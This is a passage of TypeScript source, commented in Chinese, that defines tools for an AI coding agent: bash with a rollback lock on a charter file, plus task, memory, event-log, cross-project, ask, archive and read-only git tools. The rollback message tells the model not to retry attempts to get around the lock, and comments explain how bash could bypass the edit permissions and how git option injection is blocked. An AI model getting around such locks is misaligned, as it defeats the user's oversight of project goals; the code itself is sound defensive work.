        //    先存档，回滚才从"不可逆"变成"可逆"。
        let savedNote: string;
        try {
          if (after === null) {
            savedNote = '（这次命令把该文件删掉了，已按执行前的版本恢复）';
          } else {
            writeFileSync(resolve(process.cwd(), CHARTER_REJECTED_FILE), after, 'utf-8');
            savedNote = `被回滚的那一版原样存在 ${CHARTER_REJECTED_FILE}（要看或要比对随时读它）`;
          }
        } catch (e) {
          savedNote = `⚠ 存档失败（${e instanceof Error ? e.message : String(e)}）—— 被回滚的内容没能留下来`;
        }

        // ② 回滚
        let restoreNote = '';
        try {
          // 跑之前不存在 → 删掉这次新建出来的；否则写回原文
          if (charterBefore === null) unlinkSync(charterAbs);
          else writeFileSync(charterAbs, charterBefore, 'utf-8');
        } catch (e) {
          restoreNote = `\n  ⚠ 回滚**失败**（${e instanceof Error ? e.message : String(e)}）—— 请手动检查这个文件。`;
        }

        // ③ 记账进事件库（追加型事实层）：回滚是本工具干的，必须留痕。
        //    注意 check 的是长度上限 —— addNarrative 的字段有 400 字上限，
        //    所以全文靠上面的旁挂文件，这里只留一段摘要 + 指路。
        //    记账失败不改变"回滚已经发生"这个事实，所以吞掉异常。
        try {
          evs.addNarrative({
            kind: 'system',
            title: '[契约锁] bash 改动了 CHARTER.md，已回滚',
            context: `命令：${cmd}`,
            decision: '锁定状态下目标文档（契约）不得改动 —— 已还原到本次命令执行前的版本',
            reason: 'bash 能绕过 write/edit 直接改盘，故在效果侧补一道事后闸',
            outcome: after === null
              ? '（文件被删除，已恢复为执行前的版本）'
              : `全文见 ${CHARTER_REJECTED_FILE}；开头是：${after.slice(0, 120)}`,
            tags: ['charter', 'rollback'],
          }, EVENTS_FILE);
        } catch { /* 记账失败不影响回滚结论 */ }

        return '[契约锁] .flint/CHARTER.md 在本次命令执行期间被改动，已回滚到执行前的版本。'
          + `${restoreNote}\n`
          + `  命令：${cmd}\n`
          + '  为什么：bash 是唯一能绕过 write/edit 直接改盘的工具，所以这里按**效果**兜底 ——\n'
          + '  不看命令怎么写，只要锁定期间这个文件的内容变了就会被还原（本会话尚未 /charter unlock）。\n'
          + `  ${savedNote}\n`
          + '  事件库里也记了一条（search_events 搜 charter 可见）。\n'
          + '  若这是用户本人在编辑器里的改动：请先 /charter unlock 再改。\n'
          + '  若你是想绕开契约锁改目标文档：不要重试，先向用户说明要改什么、为什么。';
      };

      try {
        const { execSync } = await import('node:child_process');

        const raw = execSync(cmd, {
          encoding: 'buffer',
          timeout: 30000,
          maxBuffer: 4096 * 1024,
          windowsHide: true,
        });

        const trimmed = decodeChildOutput(raw).trim();

        // 早退分支（含"无输出"）之前先过效果闸：改盘是副作用，与命令输出无关
        const violation = contractAfterRun();
        if (violation !== null) return toolError(violation);

        if (!trimmed) {
          return toolOk(`命令执行成功（无输出）: ${cmd.slice(0, 100)}`);
        }

        // 行数与字符数都按**截断前**的原文算。改前 lineCount 取的是截断后的串，而同一句里
        // "共 N 字符"取的是截断前的数——一前一后自相矛盾，且输出一万行被截到 4000 字符时
        // 标签会显示"(50 行输出)"，模型据此以为命令只输出了 50 行
        const lineCount = trimmed.split('\n').length;
        const shown = trimmed.length > 4000
          ? `${trimmed.slice(0, 4000)}\n...（输出截断：共 ${trimmed.length} 字符、${lineCount} 行，此处只显示前 4000 字符）`
          : trimmed;

        return toolOk(`命令执行成功 (${lineCount} 行输出，${trimmed.length} 字符):\n${shown}`);
      } catch (e) {
        // 命令失败也可能已经把文件改了（`echo x > CHARTER.md && false`），所以这条路径也要过闸
        const violation = contractAfterRun();
        if (violation !== null) return toolError(violation);
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        const msg = e instanceof Error ? e.message.slice(0, 500) : String(e);
        return toolError(`命令执行失败: ${msg}`);
      }
    },
  }));

  /* ── Todo：维护任务清单（C 方案的"工具做接口"） ──
     真相源是注入的 TaskStore（内存结构化状态）；本工具只做**增量**变更（传 op + index + text），
     返回值就是渲染后的整份清单 —— 模型下一轮自然看到最新进度，不必自己重抄。
     每次变更后把状态**投影**到 TASK.md（系统行为，不走权限弹窗）：进程重启后由 main 读它当种子。
     刻意不做的事：不做嵌套参数（items 数组）。spec.ts 只给 5 种标量形状，且"清单本体住在工具的
     状态里"正是本设计的关键 —— 参数保持标量，状态与校验都收在 TaskStore 一处。 */
  tools.register(defineTool({
    name: 'todo',
    description: '维护任务步骤清单（长任务用，保证多步任务不断链）。op: add 追加一项（需 text）/ start 标记某项进行中 / done 标记某项完成 / clear 清空。同一时刻至多一项"进行中"。返回值是带序号的整份清单，序号即下次 start/done 要传的 index。清单会投影到 TASK.md，进程重启后仍可续。简单问答、闲聊不要用本工具。',
    spec: {
      op: str('操作', '要做的操作：add（追加一项，需 text）/ start（标记进行中，需 index）/ done（标记完成，需 index）/ clear（清空）'),
      index: optPosInt('项序号', '目标项的序号（1 基，与返回值里的编号一致），start / done 使用。缺省 1。示例: 2', 1),
      text: optStr('任务文本', 'add 时的步骤描述（单行）。示例: "改 tools/builtin.ts 并跑验证"', ''),
    },
    handler: async (args) => {
      try {
        const { op, index, text } = args;
        switch (op) {
          case 'add': {
            if (store.add(text) < 0) {
              return toolInvalid(`add 需要非空的 text（要追加的步骤描述）`);
            }
            break;
          }
          case 'start': {
            if (!store.start(index)) {
              const t = store.counts().total;
              return toolInvalid(`start 的 index=${index} 越界（当前 ${t} 项，序号 1..${t}）`);
            }
            break;
          }
          case 'done': {
            if (!store.done(index)) {
              const t = store.counts().total;
              return toolInvalid(`done 的 index=${index} 越界（当前 ${t} 项，序号 1..${t}）`);
            }
            break;
          }
          case 'clear':
            store.clear();
            break;
          default:
            return toolInvalid(`未知操作 op=${op}，可用的是 add / start / done / clear`);
        }

        // 投影到 TASK.md（失败不致命：内存仍是真相源，只是丢跨重启存档）
        const warn = store.projectToFile('TASK.md');
        // 历史归档紧跟投影：清单"全完成"的那次操作把快照追加进 TASK_HISTORY.md
        //（/tasks 回看用）。没到全完成时它是 no-op；写失败同样不致命，与投影合并提醒
        const hadPending = store.hasPendingArchive();
        const histWarn = store.archiveToFile(TASK_HISTORY_FILE);
        // 事件库自动补记（确定性钩子，不经模型）：归档真正消费掉快照的那次才记——
        // 写失败时快照保留、下次操作重试，此刻不记可避免双记
        if (hadPending && histWarn === null) {
          const done = store.lastCompleted();
          if (done && done.length > 0) evs.recordTaskArchive(done, EVENTS_FILE);
        }
        const c = store.counts();
        if (c.total === 0) return toolOk(`任务清单已清空（TASK.md 已移除）`);
        const head = `任务清单（${c.total} 项：${c.done} 完成 / ${c.active} 进行中 / ${c.pending} 待办）`;
        const warnParts = [warn && `TASK.md 写入失败：${warn}`, histWarn && `历史归档写入失败：${histWarn}`]
          .filter((s): s is string => Boolean(s));
        const tail = warnParts.length > 0
          ? `\n（注：${warnParts.join('；')} —— 内存状态仍有效，但存档不完整）`
          : '';
        return toolOk(`${head}\n${store.renderNumbered()}${tail}`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`todo 执行失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── Memory：项目长期记忆（C 方案的第二次落地，真相源在 src/memory/store.ts） ──
     与 todo 同构：工具只做增量意图，返回值带序号整份清单；投影到 .flint/memory.md
     （系统行为不走权限弹窗），进程重启后由 main 读它当种子。
     记忆没有复选框与"全勾选即删"——它不会过期，删除只有显式的 remove。 */
  tools.register(defineTool({
    name: 'memory',
    description: '维护项目长期记忆（跨会话持久的约定/架构决策/踩过的坑，每次请求都会注入上下文）。op: add 追加一条（需 text）/ remove 删除某条（需 index）/ list 列出全部 / clear 清空。一条 = 一行，建议一句话说清"什么+为什么"；与已有条目逐字相同会被拒绝。只记真正值得跨会话保留的结论，一次性任务细节、临时状态不要记（那些归 todo）。',
    spec: {
      op: str('操作', '要做的操作：add（追加一条，需 text）/ remove（删除第 index 条，需 index）/ list（列出全部）/ clear（清空）'),
      index: optPosInt('条目序号', '目标条目的序号（1 基，与返回值里的编号一致），remove 使用。缺省 1。示例: 2', 1),
      text: optStr('记忆内容', 'add 时要记住的内容（单行）。示例: "PermissionManager 用精确匹配不是前缀匹配，autoKey 不截断"', ''),
    },
    handler: async (args) => {
      try {
        const { op, index, text } = args;
        switch (op) {
          case 'add': {
            const r = mem.add(text);
            if (r === -1) return toolInvalid(`add 需要非空的 text（要记住的内容）`);
            if (r === -2) return toolInvalid(`相同条目已存在，不重复记录: ${text}`);
            break;
          }
          case 'remove': {
            if (!mem.remove(index)) {
              const t = mem.count();
              return toolInvalid(`remove 的 index=${index} 越界（当前 ${t} 条，序号 1..${t}）`);
            }
            break;
          }
          case 'list':
            break;
          case 'clear':
            mem.clear();
            break;
          default:
            return toolInvalid(`未知操作 op=${op}，可用的是 add / remove / list / clear`);
        }

        // 投影到 .flint/memory.md（失败不致命：内存仍是真相源，只是丢跨重启存档）
        const warn = mem.projectToFile(MEMORY_FILE);
        const n = mem.count();
        if (n === 0) return toolOk(`项目记忆已清空（${MEMORY_FILE} 已移除）`);
        const tail = warn ? `\n（注：记忆文件写入失败：${warn} —— 内存状态仍有效，但跨重启存档不完整）` : '';
        return toolOk(`项目记忆（${n} 条，跨会话持久，每次请求注入）:\n${mem.renderNumbered()}${tail}`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`memory 执行失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── RecordEvent：写历史事件库（src/eventlog/store.ts） ──
     叙事条目（决策/经验/事故）四段分开写——检索的价值就在"来龙去脉齐不齐"。
     工具调用本身由打卡自动捕获（main.ts 订阅 span），本工具只管"值得留的结论"。 */
  tools.register(defineTool({
    name: 'record_event',
    description: '把一条值得留的事件存进项目历史事件库（追加型档案；平时不进上下文，需要时用 search_events 检索）。用于：重要决策（为什么这么定）、经验（怎么做成的事）、事故与坑（怎么踩的、怎么解的）。title 写得像书签便于日后检索；context/decision/reason/outcome 尽量写全——只有标题没有来龙去脉的事件等于没存。普通工具调用会被系统自动记录，不要用本工具转存。',
    spec: {
      kind: str('事件类型', 'decision（决策）/ experience（经验）/ incident（事故与坑）'),
      title: str('标题', '一句话书签式概括。示例: "edit 多命中时拒绝而不是猜第一处"'),
      context: optStr('背景', '当时的情境：什么问题、什么症状。', ''),
      decision: optStr('决策', '做了什么决定 / 怎么解决的。', ''),
      reason: optStr('理由', '为什么这么决定（备选方案为何不选）。', ''),
      outcome: optStr('结果', '结果如何（验证结论 / 遗留风险）。', ''),
      tags: optStr('标签', '逗号分隔的检索标签。示例: "ui,权限,并发"', ''),
    },
    handler: async (args) => {
      try {
        const kind = args.kind.trim();
        if (!(NARRATIVE_KINDS as readonly string[]).includes(kind)) {
          return toolInvalid(`kind 必须是 ${NARRATIVE_KINDS.join(' / ')} 之一（tool_call 由系统自动记录，不接受手写）`);
        }
        const tags = args.tags.split(/[,，]/).map((t) => t.trim()).filter(Boolean);
        const { entry, warn } = evs.addNarrative({
          kind: kind as (typeof NARRATIVE_KINDS)[number],
          title: args.title,
          context: args.context,
          decision: args.decision,
          reason: args.reason,
          outcome: args.outcome,
          tags,
        }, EVENTS_FILE);
        const tail = warn ? `\n（注：事件库写入失败：${warn} —— 内存索引仍有效，但这份没进磁盘档案）` : '';
        return toolOk(`事件已存档 (${entry.id}):\n${formatEvent(entry)}\n事件库现有 ${evs.count()} 条；检索用 search_events。${tail}`);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`record_event 执行失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── SearchEvents：读历史事件库（拉通道——命中才进当轮上下文） ──
     最新在前：最近的经验最可能相关；limit 截断防一次检索灌爆上下文。 */
  tools.register(defineTool({
    name: 'search_events',
    description: '检索项目历史事件库：过去的决策/经验/事故记录，以及系统自动记录的工具调用历史。遇到"这个以前是怎么解决的 / 有没有踩过这个坑 / 当时为什么这么定"时先查这里，不要凭记忆猜。按类型/标签/关键词过滤可组合，只返回命中的条目。',
    spec: {
      kind: optStr('事件类型', '按类型过滤：decision / experience / incident / tool_call。缺省不过滤。示例: "incident"', ''),
      tag: optStr('标签', '按标签精确匹配一个。缺省不过滤。示例: "ui"', ''),
      keyword: optStr('关键词', '按关键词子串过滤（匹配标题/背景/决策/理由/结果/标签，不区分大小写）。缺省不过滤。示例: "弹窗"', ''),
      limit: optPosInt('最大条数', '最多返回多少条（最新的在前）。缺省 10。示例: 20', 10),
    },
    handler: async (args) => {
      try {
        const hits = evs.search({ kind: args.kind, tag: args.tag, keyword: args.keyword, limit: args.limit });
        if (hits.length === 0) {
          return toolNegative('NO_MATCH', `无匹配事件（事件库共 ${evs.count()} 条）。可放宽 kind / tag / keyword 再试。`);
        }
        return toolOk(`命中 ${hits.length} 条（最新在前；事件库共 ${evs.count()} 条）:\n`
          + hits.map((e, i) => formatEvent(e, i + 1)).join('\n───\n'));
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`search_events 执行失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── PullEvents：跨项目拉取别的项目的事件库（ROADMAP P9） ──
     用户许可闸是本工具存在的理由：跨项目读档案 = agent 能看到别的项目的决策与踩坑，
     属于敏感面——必须过 requirePermission（TTY 弹窗授权；授权键 = 目标项目路径，
     "本次全部允许"的粒度是"这个项目"，不是"所有项目"）。 */
  tools.register(defineTool({
    name: 'pull_events',
    description: '拉取另一个项目的历史事件库（决策/经验/事故/系统里程碑），用于跨项目复用经验——"别的项目是怎么解决这类问题的"。project 传项目目录路径，或注册表里的项目短名（目录名）。跨项目读取需要用户授权，弹窗确认后才会执行。只拉叙事与关键节点，不含工具调用流水。',
    requirePermission: true,
    // 授权边界 = 目标项目路径：同意拉 A 项目 ≠ 同意拉任何项目
    permissionKey: (args) => String(args.project ?? '').replace(/\\/g, '/'),
    permissionDetail: (args) => {
      const flat = (v: unknown): string => String(v ?? '').replace(/\s+/g, ' ').trim();
      return `跨项目读取事件库: ${flat(args.project).slice(0, 70) || '?'}`;
    },
    spec: {
      project: str('目标项目', '另一个项目的目录路径，或项目短名（注册表里的目录名，如 "flint"）。示例: "C:/work/another-project" 或 "another-project"'),
      kind: optStr('事件类型', '按类型过滤：decision / experience / incident / system。不支持 tool_call（流水不跨项目拉取）。缺省不过滤。示例: "incident"', ''),
      tag: optStr('标签', '按标签精确匹配一个。缺省不过滤。示例: "并发"', ''),
      keyword: optStr('关键词', '按关键词子串过滤（标题/四段/标签，不区分大小写）。缺省不过滤。示例: "压缩"', ''),
      limit: optPosInt('最大条数', '最多返回多少条（最新的在前）。缺省 10。示例: 20', 10),
    },
    handler: async (args) => {
      try {
        if (args.kind.trim() === 'tool_call') {
          return toolInvalid('kind=tool_call 不支持跨项目拉取（工具流水留在各项目本地，只拉叙事与关键节点）');
        }
        const resolved = projectRegistry.resolve(args.project);
        if (!resolved) {
          return toolInvalid(`project "${args.project}" 解析不到：不是有效路径，也不在项目注册表（~/.flint/projects.jsonl）里。可让用户看注册表里登记了哪些项目`);
        }
        const foreign = new EventStore();
        foreign.loadFromFile(`${resolved}/.flint/events.jsonl`);
        const hits = foreign.search({ kind: args.kind, tag: args.tag, keyword: args.keyword, limit: args.limit });
        if (hits.length === 0) {
          return toolNegative('NO_MATCH', `项目 ${resolved} 无匹配事件（其事件库共 ${foreign.count()} 条）。可放宽 kind / tag / keyword 再试。`);
        }
        return toolOk(`来自项目 ${resolved} 的 ${hits.length} 条事件（最新在前；该项目事件库共 ${foreign.count()} 条）:\n`
          + hits.map((e, i) => formatEvent(e, i + 1)).join('\n───\n'));
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`pull_events 执行失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── Ask：分叉点提问（截断当前行为，等用户拍板） ──
     与权限弹窗的**根本区别**：权限回答"这次调用要不要跑"（是/否，放行也不改变方向）；
     本工具回答"这个设计该选哪条路"（**会改变后面所有代码的形态**）。故两者不共用通道
     （同 C11 判据：混进同一个授权键空间，一次"本次全部允许"会把提问也静默打开）。

     两条刻意与权限闸相反的地方：
     ① **fail-closed**：没有可交互终端时一个选项都不选（权限闸那里是自动放行）。
        替用户在 A/B 之间选一个，比不提供这个功能更糟——详见 src/project/fork.ts 文件头。
     ② **拍板即留痕**：用户选了哪条路是**事实**，由本工具确定性地写进事件库
        （kind=decision），不依赖模型记得去 record_event。而"决定该写进路线图哪一行、
        怎么措辞"是**判断**，留给模型按回话指令做——程序做不了判断，就别假装能做。 */
  tools.register(defineTool({
    name: 'ask',
    description: '遇到技术选型分叉点（有几个都可行、各有实质取舍、选错要返工的方案）时，向用户提问并停下来等答复。options 用 | 分隔候选方案，每项可写 "标签: 说明"。用户可当场拍板；也可选择"先讨论"——那时不要继续往下做，先按 grill-me 技能的方式（一次一问、每题附推荐答案）把问题与矛盾点聊清楚，再把分叉点抛回给用户。不要拿能自己判断的小事打扰用户。',
    spec: {
      question: str('问题', '要用户拍板的那一个问题，一句话。示例: "会话存储用哪种方案？"'),
      options: str('候选方案', '两个以上候选，用 | 分隔；每项可写 "标签: 说明"。示例: "A 单文件: 最简单|B 每会话一文件: 抗并发|C SQLite: 可查询"'),
      context: optStr('背景', '为什么在这里卡住、各方案的关键取舍（一句话）。示例: "要支持并发写入，且不想为它引入运行时依赖"', ''),
    },
    handler: async (args) => {
      const candidates = parseCandidates(args.options);
      // 一个候选 = 没有分叉，那不该来问用户（要么它自己定，要么这是"通知"不是"提问"）
      if (candidates.length < 2) {
        return toolInvalid(`options 至少要有两个候选方案（用 | 分隔），当前只解析出 ${candidates.length} 个：「${args.options}」`
          + `\n若这根本不是分叉点，就别调用本工具，直接按你自己的判断做并说明理由。`);
      }

      const picked = await askFn(buildForkTitle(args.question, args.context), buildChoices(candidates));
      const outcome = classifyChoice(picked, candidates);

      // 决定留痕（确定性）。写失败不致命（内存索引仍在），但要在回话里说一声——
      // 静默丢一次用户决策，比丢一次工具流水严重得多。
      let warn: string | null = null;
      if (outcome.kind !== 'unavailable') {
        const decided = outcome.kind === 'decide';
        const label = decided ? outcome.candidate.label : '（先讨论，未拍板）';
        const r = evs.addNarrative({
          kind: 'decision',
          title: `${decided ? '[分叉点]' : '[分叉点·待讨论]'} ${args.question.trim()} → ${label}`,
          context: args.context.trim() || `候选方案：${candidates.map((c) => c.label).join(' / ')}`,
          decision: decided
            ? `用户选定：${outcome.candidate.label}${outcome.candidate.description ? `（${outcome.candidate.description}）` : ''}`
            : '用户选择先讨论，暂不拍板',
          reason: decided ? args.context.trim() : '需要先把问题 / 矛盾点 / 抉择对象聊清楚',
          outcome: decided ? '待落地（见路线图 / DEVLOG）' : '讨论后再定（届时重抛分叉点）',
          tags: decided ? ['分叉点', '技术选型'] : ['分叉点', '待讨论'],
        }, EVENTS_FILE);
        warn = r.warn ?? null;
      }

      const body = formatForkResult(args.question, args.context, candidates, outcome);
      return toolOk(warn ? `${body}\n（注：事件库写入失败：${warn} —— 决定本身仍然有效，只是这份没进磁盘档案）` : body);
    },
  }));

  /* ── Archive：坐标归档（ROADMAP 10.12.6 + 10.12.8 + 10.12.11 三件事的同一个落点） ──
     一个坐标"走完"这件事必须写成两处，因为有两种读者：
       · `.flint/DEVLOG.md` —— 人读散文（前后区别 / 意义 / 影响面 / 遗留），只追加；
       · 事件库 —— 机读四段（可检索、可跨会话翻）。
     两者**刻意不互替**：散文进不了检索，四段字段读不出语气。这就是 10.12.8「归档双写」。

     顺带推进路线图状态位 + 提议下一坐标（10.12.11）：这三件事**同源于"归档这一刻"**，
     拆开做必然出现"日志写了、状态忘了改"的断链——而那正是协议此前只能靠模型记性的地方。
     把"记得改状态""记得提下一步"交给工具，是因为两者都是**输入的函数**（编号序 + 依赖关系），
     程序算得出来，就不该让人记。

     ── 为什么不用权限弹窗 ──
     与 todo / memory 同一取位：这是**系统行为**，记的是"已经发生的事"，不是"要改动项目内容"。
     每收一个坐标弹一次窗，只会训练用户无脑放行。也刻意**不碰 CHARTER**：那把锁保护的是
     目标（契约），路线图是**现状**，本来就该随进展漂移（三件套的修改策略三分）。

     ── 为什么"未命中就一字不落盘" ──
     与 write / edit 同一条设计原则（拿不准时拒绝、不留半成品）：编号写错、路线图本身格式坏、
     把父坐标当叶子归档——这三种都是**模型搞错了对象**，此时写一份 DEVLOG 与一条事件，
     只会在档案里留下一节对不上任何坐标的记录，比拒绝一次的代价大得多。 */
  tools.register(defineTool({
    name: 'archive',
    description: '把一个**项目坐标**归档（.flint/ROADMAP.md 里存在的编号走完时用）。一次做三件事：把"前后区别 / 意义 / 影响面 / 遗留"追加进 .flint/DEVLOG.md（只追加）、记一条 system 事件、把路线图里那个坐标标成 已完成，并顺带告诉你下一坐标是哪条。前后区别必须基于 git diff 或验证结果，不许凭记忆。只用于项目级坐标，普通任务与 todo 步骤不要用它。',
    spec: {
      coord: str('坐标编号', '要归档的坐标编号（分段编号，如 10.12.6）。必须已存在于 .flint/ROADMAP.md，且不能是父坐标（父坐标的状态由子坐标派生）'),
      changes: str('前后区别', '这一步改动了什么（前后对比）。必须基于 git diff 或验证结果，不许凭记忆。示例: "新增 lifecycle.ts 与 archive 工具，路线图状态不再靠手改"'),
      meaning: str('意义', '这一步的价值——改变了什么，而不只是做了什么。示例: "把『记得改状态』从模型自觉变成程序必做"'),
      impact: str('影响面', '牵动了哪些模块 / 文件 / 谁会受影响。示例: "tools 子系统工具数 +1；core-section 归档段改写"'),
      leftover: optStr('遗留', '还没做完或已知的坑；没有就留空。示例: "10.12.9 仍依赖 10.5.1 的 git 工具"', ''),
      evidence: optStr('验证证据', '跑出来的验证结果；没有就留空。示例: "36 套 1660 项 0 失败、tsc --noEmit EXIT=0"', ''),
    },
    handler: async (args) => {
      try {
        const { coord, changes, meaning, impact, leftover, evidence } = args;
        const { existsSync, readFileSync, appendFileSync, writeFileSync, mkdirSync } = await import('node:fs');
        const { dirname } = await import('node:path');

        // ① 路线图：有就读+解析。**有错、没这个编号、或它是个父坐标 → 拒绝且一字不落盘**
        let coords: Coord[] | null = null;
        let roadmapMd = '';
        let title = coord;
        if (existsSync(ROADMAP_FILE)) {
          roadmapMd = readFileSync(ROADMAP_FILE, 'utf-8');
          const parsed = parseRoadmap(roadmapMd);
          if (parsed.errors.length > 0) {
            return toolInvalid(`路线图格式有错，先按门禁要求修好再归档（一字未落盘）：\n${parsed.errors.join('\n')}`);
          }
          const hit = parsed.coords.find((c) => c.id === coord);
          if (hit === undefined) {
            return toolInvalid(`路线图里没有编号 ${coord}（一字未落盘）。表内现有编号：`
              + `${parsed.coords.map((c) => c.id).join(' / ')}`);
          }
          if (isParent(coord, parsed.coords)) {
            return toolInvalid(`编号 ${coord} 是**父坐标**（它只是容器，状态由子坐标派生，写上去也会被覆盖）。`
              + `请归档具体的叶子坐标：${parsed.coords.filter((c) => parentOf(c.id) === coord).map((c) => c.id).join(' / ')}`);
          }
          title = hit.title;
          coords = parsed.coords;
        }

        // ② 双写之一：DEVLOG（人读散文，只追加）。它**就是**这次归档的产物，
        //    写不进去就是没归档成功 → 直接 [ERROR]，且此时还没有任何东西落盘。
        try {
          mkdirSync(dirname(DEVLOG_FILE), { recursive: true });
          const head = existsSync(DEVLOG_FILE) ? '' : DEVLOG_HEADER;
          const entry = renderDevlogEntry({
            coord, title, at: formatStamp(new Date()),
            changes, meaning, impact, leftover, evidence,
          });
          appendFileSync(DEVLOG_FILE, `${head}${entry}`, 'utf-8');
        } catch (e) {
          return toolError(`开发日志写入失败: ${e instanceof Error ? e.message : String(e)}`);
        }

        // ③ 路线图状态推进：**只换表那几行**，表外散文一行不碰。
        //    写前先 resolveStatuses —— 落盘的是权威状态（父行占位值也一并换成派生值）。
        const warnings: string[] = [];
        if (coords !== null) {
          try {
            coords = resolveStatuses(setStatus(coords, coord, '已完成'));
            writeFileSync(ROADMAP_FILE, spliceCoordTable(roadmapMd, coords), 'utf-8');
          } catch (e) {
            warnings.push(`路线图写入失败：${e instanceof Error ? e.message : String(e)} —— 日志已写，状态未推进`);
          }
        }

        // ④ 双写之二：事件库（机读四段）。写失败不致命（与 todo/memory 同一口径），
        //    但必须在回执里说一声——静默丢一次归档，档案就少了一块且没人知道。
        const tail = [leftover.trim() && `遗留：${leftover.trim()}`, evidence.trim() && `验证证据：${evidence.trim()}`]
          .filter((s): s is string => Boolean(s)).join('；');
        const r = evs.addNarrative({
          kind: 'system',
          title: `[归档] ${coord} ${title}`,
          context: `前后区别：${changes}`,
          decision: `意义：${meaning}`,
          reason: `影响面：${impact}`,
          ...(tail ? { outcome: tail } : {}),
          tags: ['archive', coord],
        }, EVENTS_FILE);

        // ⑤ 回执：顺带把"下一坐标"算出来（纯依赖 + 编号序，是输入的函数，不是判断）
        const cs = coords;
        const next = cs === null ? null : nextCoord(cs);
        const blocked = cs === null ? [] : cs
          .filter((c) => !isParent(c.id, cs) && c.status === '未开始')
          .map((c) => ({ id: c.id, missing: unmetDeps(cs, c.id) }))
          .filter((b) => b.missing.length > 0)
          .slice(0, 3);
        const remainingLeaves = cs === null ? 0
          : cs.filter((c) => !isParent(c.id, cs) && c.status !== '已完成' && c.status !== '搁置').length;
        // 依赖环：与"被依赖卡住"同为"提不出下一坐标"的原因，但性质不同——环再等也不会通，
        // 得人去改表。故单独算出来交给回执点名（findCycles 纯函数，零 import）
        const cycles = cs === null ? [] : findCycles(cs);

        const body = formatArchiveReceipt({
          coord, title,
          devlogPath: DEVLOG_FILE,
          roadmapPath: cs === null ? null : ROADMAP_FILE,
          eventWarn: r.warn ?? null,
          next: next === null ? null : { id: next.id, title: next.title },
          blocked,
          cycles,
          remainingLeaves,
        });
        return toolOk(warnings.length > 0 ? `${body}\n（注：${warnings.join('；')}）` : body);
      } catch (e) {
        if (e instanceof ToolInputError) return toolInvalid(e.message);
        return toolError(`archive 执行失败: ${e instanceof Error ? e.message : String(e)}`);
      }
    },
  }));

  /* ── Git：只读结构化查询（ROADMAP 10.5.1） ──
     与 bash 的分工：bash 是"万能但危险"——它能改一切，所以必须弹窗，且授权边界是**整条命令**；
     于是模型顺手把 `git status && git commit -m x` 拼成一条，读与写就被绑在同一次授权里。
     本工具是"窄但安全"：只跑八条只读命令，**argv 数组不经 shell**，不弹窗。

     ── 为什么不需要权限弹窗 ──
     与 ls / read / grep 同一取位：读不改变任何东西。弹窗的价值在"拦下会改东西的动作"，
     给只读操作弹窗只会训练用户无脑放行（真正的写闸是 ROADMAP 10.5.2）。

     ── 为什么 op 是白名单，而不是"传一条 git 子命令" ──
     若参数是命令字符串，本工具立刻退化成"免弹窗的 bash"，把 bash 的整套权限设计绕过去。
     op 只有八个取值、路径只进 `--` 之后、target 以 `-` 开头会被拒（见 validateTarget），
     于是"模型在这里能执行什么"是被**结构**限死的，不靠提示词自觉。

     ── 2026-09-15 补厚覆盖面（show / blame / remote / tag） ──
     加它们的判据是**只读 + 高频**：这四件事此前都只能走 bash 的弹窗通道，而"看一眼"本不该问。
     每一条的边界都刻意收在"参数形状可枚举"这一侧：`show` 只给提交元信息 + 文件级增删行数
     （**不给 diff 正文**——那是让模型接管一屏文本，属另一个 op 的事）；`blame` 的 `lines` 只收
     纯数字范围，**不把 `-L` 的完整语法交出去**（否则这个 op 就开始退化成"半条命名的 git 命令"）；
     `remote` 的 URL **一律打码**（那是唯一一处"看着只读、却可能把凭据读进模型上下文"的口子）；
     `tag` 只能看、不能打（打标签是写操作）。 */
  tools.register(defineTool({
    name: 'git',
    description: '查看当前 git 仓库的**只读**信息（不会改动任何东西）。op: status 看当前分支与工作区脏了什么 / diff 看改了哪些文件、各增删多少行 / log 看最近的提交 / branch 看所有分支与跟踪关系 / show 看某一次提交改了什么 / blame 看某个文件每一行是谁写的 / remote 看远端配置 / tag 看标签列表。查这些一律用本工具，**不要用 bash 去跑 git status / git log 之类**（bash 会弹权限窗、且只回原始文本；裸命令会被程序拦下来转到这里）；要 commit、push、checkout、tag 等写操作时才改用 bash。',
    spec: {
      op: str('操作', '要做的操作：status（当前分支 + 工作区状态）/ diff（文件级增删行数）/ log（提交历史）/ branch（分支列表）/ show（某次提交的元信息与文件级改动）/ blame（逐行归属）/ remote（远端列表）/ tag（标签列表）'),
      target: optStr('版本引用', 'diff 用：差异基准，`staged` 看已 add 的改动、留空看还没 add 的改动、也可写某个 ref（如 HEAD~1）。show 用：要看哪一次提交（留空 = HEAD）。blame 用：从哪个版本开始追责（留空 = 当前工作区）。示例: "HEAD~1"', ''),
      path: optStr('限定路径', 'diff / show 用：只看某个文件或目录（仓库根相对），留空 = 全仓库。blame 用：**必填**，要追责的那个文件。示例: "src/tools"', ''),
      lines: optStr('行范围', '仅 blame 用：只追某几行。写单个行号（"10"，**只追这一行**）或「起,止」（"10,20"）。留空 = 整份文件。示例: "10,20"', ''),
      limit: optPosInt('条数', '仅 log 用：取最近几条（1-50）。默认 10。示例: 20', 10),
    },
    handler: async (args) => {
      try {
        const { op, target, path: onlyPath, lines, limit } = args;
        const opValue = op as GitOp;

        if (!GIT_OPS.includes(opValue)) {
          return toolInvalid(`未知操作 op=${op}，可用的是 ${GIT_OPS.join(' / ')}`);
        }
        // target 落在 `--` **之前** = git 的选项位置，能变成 --output=文件（见 validateTarget）。
        // diff / show / blame 三个 op 的 target 都在那个位置，共过同一道闸。
        if (opValue === 'diff' || opValue === 'show' || opValue === 'blame') {
          const bad = validateTarget(target);
          if (bad !== null) return toolInvalid(bad);
        }
        if (opValue === 'blame') {
          // spec 表达不了"仅当 op=blame 时 path 必填"，所以这条落在 handler 里
          if (onlyPath.trim() === '') {
